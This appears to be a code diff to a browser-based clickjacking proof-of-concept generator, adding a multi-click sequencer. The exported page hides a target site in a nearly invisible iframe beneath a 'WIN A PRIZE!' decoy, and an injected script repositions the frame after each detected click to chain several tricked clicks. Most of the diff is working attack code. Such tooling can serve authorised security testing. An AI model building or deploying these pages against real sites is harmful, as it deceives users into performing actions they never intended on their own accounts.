@@ -143,10 +143,11 @@
 
     <div id="controls">
         <h3>PoC Calibration</h3>
-        <p style="font-size:12px">1. Align the target button under the Decoy.</p>
-        <p style="font-size:12px">2. Export HTML when ready.</p>
+        <p style="font-size:12px">1. Align target button under decoy.</p>
+        <p style="font-size:12px">3. If attack is multi-click, record step and reposition iframe for next click (requires guessing from second click onwards, unfortunately.)</p>
+        <p style="font-size:12px">3. If only single-click, just export the HTML when ready.</p>
         
-        <label class="label">Target Opacity:</label>
+        <label class="label">Target Opacity (exports to 0.0001):</label>
         <input type="range" min="0" max="1" step="0.1" value="0.5" id="opacitySlider">
         
         <label class="label">Decoy Type:</label>
@@ -158,8 +159,16 @@
         
         <label class="label">Decoy Text:</label>
         <input type="text" value="WIN A PRIZE!" id="decoyText" style="width: 100%">
-
+        
         <hr>
+        <label class="label">Multi-Click Sequencer:</label>
+        <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+            <button onclick="recordStep()" style="flex: 1;">Record Step</button>
+            <button onclick="clearSteps()" style="flex: 1; background: #d9534f; color: white; border: white;">Reset</button>
+        </div>
+        <p id="stepDisplay" style="font-size: 10px; margin: 0;">Steps Recorded: 0</p>
+        <hr>
+
         <button onclick="exportPoC()" style="width:100%; padding: 8px; cursor:pointer;">Export Final HTML</button>
         <p id="coords" style="font-size: 10px; font-family: monospace; margin-top: 10px;"></p>
     </div>
@@ -202,11 +211,39 @@
         const decoyRedirect = document.getElementById('decoy_redirect');
         const decoyType = document.getElementById('decoyType');
         const decoyText = document.getElementById('decoyText');
+        let steps = [];
+        let currentStepIndex = 0;
         
         let isDragging = false;
         let isResizing = false;
         let startX, startY, initialLeft, initialTop, initialWidth, initialHeight;
         let resizeDir = '';
+
+        function recordStep() {
+            // Save current state of the iframe
+            const step = {
+                top: container.style.top || '0px',
+                left: container.style.left || '0px',
+                width: container.style.width || '80%',
+                height: container.style.height || '80%'
+            };
+            
+            steps.push(step);
+            
+            // Update UI
+            document.getElementById('stepDisplay').innerText = `Steps Recorded: ${steps.length}`;
+            
+            // Visual feedback
+            const btn = document.querySelector('button[onclick="recordStep()"]');
+            const originalText = btn.innerText;
+            btn.innerText = "Saved!";
+            setTimeout(() => btn.innerText = originalText, 500);
+        }
+
+        function clearSteps() {
+            steps = [];
+            document.getElementById('stepDisplay').innerText = "Steps Recorded: 0";
+        }
 
         // Toggle Decoy Type
         decoyType.addEventListener('change', (e) => {
@@ -297,6 +334,10 @@
         }
 
         function exportPoC() {
+            // If no steps recorded, just use current position as a single step
+            if (steps.length === 0) {
+                recordStep();
+            }
             let style = "";
             let html = "";
             
@@ -341,28 +382,73 @@
                 html = `<button id="decoy">${decoyBtn.innerText}</button>`;
             }
 
-            const finalCode = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-        <style>
-            body { margin: 0; overflow: hidden; height: 100vh; }
-            #target_frame { 
-                position: absolute; 
-                top: ${top}; left: ${left}; 
-                width: ${width}; height: ${height}; 
-                opacity: 0.0001; z-index: 2; border: none; 
-            }
-            ${style}
-        </style>
-        </head>
-        <body>
-            ${html}
-            <iframe id="target_frame" src="${frame.src}"></iframe>
-        </body>
-        </html>`;
-            console.log(finalCode);
-            alert("PoC HTML code has been logged to the Developer Console (F12)!");
+        const stepsJSON = JSON.stringify(steps);
+
+        const finalCode = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+            <style>
+                body { margin: 0; overflow: hidden; height: 100vh; }
+                /* The iframe starts at the position of Step 1 */
+                #target_frame { 
+                    position: absolute; 
+                    top: ${steps[0].top}; left: ${steps[0].left}; 
+                    width: ${steps[0].width}; height: ${steps[0].height}; 
+                    opacity: 0.0001; z-index: 2; border: none; 
+                }
+                ${style}
+            </style>
+            </head>
+            <body>
+                <h3 style="position:fixed; bottom:0; right:0; font-family:sans-serif; font-size:10px; opacity:0.5; margin:5px;">
+                    Click Count: <span id="click_counter">0</span> / ${steps.length}
+                </h3>
+
+                ${html}
+                
+                <iframe id="target_frame" src="${frame.src}"></iframe>
+
+                <script>
+                    // THE MULTI-CLICK ENGINE
+                    const steps = ${stepsJSON};
+                    let currentStep = 0;
+                    const iframe = document.getElementById('target_frame');
+                    const counter = document.getElementById('click_counter');
+
+                    // We listen for the window losing focus (which happens when they click the iframe)
+                    window.addEventListener('blur', function() {
+                        // Wait a split second to allow the click to register in the iframe
+                        setTimeout(() => {
+                            currentStep++;
+                            
+                            if (currentStep < steps.length) {
+                                // Move iframe to the next position
+                                iframe.style.top = steps[currentStep].top;
+                                iframe.style.left = steps[currentStep].left;
+                                iframe.style.width = steps[currentStep].width;
+                                iframe.style.height = steps[currentStep].height;
+                                
+                                console.log("Advanced to Step " + (currentStep + 1));
+                                counter.innerText = currentStep;
+                                
+                                // Crucial: We must reclaim focus to detect the NEXT click
+                                window.focus(); 
+                                // Note: Browsers sometimes block programmatic focus. 
+                                // A common trick is to alert() or simply hope the user clicks the "background" 
+                                // if your decoy requires it.
+                            } else {
+                                console.log("Attack sequence complete");
+                                counter.innerText = "Done";
+                                // Optionally hide everything or redirect
+                            }
+                        }, 200);
+                    });
+                <\/script>
+            </body>
+            </html>`;
+        console.log(finalCode);
+        alert("PoC HTML code has been logged to the Developer Console (F12)!");
         }
     </script>
 </body>
